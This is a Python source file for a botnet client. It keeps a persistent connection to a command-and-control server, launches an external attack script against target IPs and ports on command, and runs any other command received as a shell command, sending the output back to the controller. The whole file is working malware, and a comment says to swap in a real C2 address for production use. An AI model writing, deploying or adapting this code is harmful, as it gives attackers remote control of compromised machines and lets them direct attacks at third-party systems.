
import socket
import subprocess
import time
import os

def connect_to_c2(c2_host, c2_port):
    """Establishes and maintains a connection to the C2 server."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((c2_host, c2_port))
            print(f"[+] Connected to C2 server at {c2_host}:{c2_port}")
            
            # Announce bot presence
            sock.sendall(b"BOT_ONLINE")

            while True:
                # Receive command from C2
                command = sock.recv(1024).decode().strip()
                if not command:
                    # Connection lost, break to reconnect
                    print("[-] Connection to C2 lost. Reconnecting...")
                    break
                
                print(f"[*] Received command: {command}")
                
                if command.lower() == 'ping':
                    sock.sendall(b"PONG")
                    
                elif command.startswith('attack'):
                    # Format: attack <method> <target_ip> <target_port> <duration>
                    parts = command.split()
                    if len(parts) == 5:
                        _, method, target_ip, target_port, duration = parts
                        
                        # Execute the attack script as a separate process
                        # This prevents the C2 connection from blocking
                        try:
                            # Assuming attack_vectors.py is in the same directory or accessible
                            script_path = os.path.join(os.path.dirname(__file__), 'attack_vectors.py')
                            if not os.path.exists(script_path):
                                 sock.sendall(b"ERROR: attack_vectors.py not found.")
                                 continue
                            
                            attack_command = [
                                'python3', 
                                script_path, 
                                method, 
                                target_ip, 
                                target_port, 
                                duration
                            ]
                            subprocess.Popen(attack_command)
                            response = f"[*] Attack initiated: {' '.join(parts[1:])}".encode()
                            sock.sendall(response)
                        except Exception as e:
                            error_msg = f"ERROR: Failed to launch attack: {str(e)}".encode()
                            sock.sendall(error_msg)
                    else:
                        sock.sendall(b"ERROR: Invalid attack command format.")

                else:
                    # For other shell commands, not recommended for raw attack bots
                    # but useful for control.
                    try:
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_value = proc.stdout.read() + proc.stderr.read()
                        sock.sendall(stdout_value)
                    except Exception as e:
                        sock.sendall(str(e).encode())

        except (socket.error, ConnectionRefusedError) as e:
            print(f"[-] C2 connection failed: {e}. Retrying in 15 seconds...")
            time.sleep(15)
        finally:
            if 'sock' in locals():
                sock.close()

if __name__ == "__main__":
    # IMPORTANT: Replace with your actual C2 server IP address
    C2_HOST = '127.0.0.1' # <-- CHANGE THIS in production
    C2_PORT = 9999
    
    connect_to_c2(C2_HOST, C2_PORT)
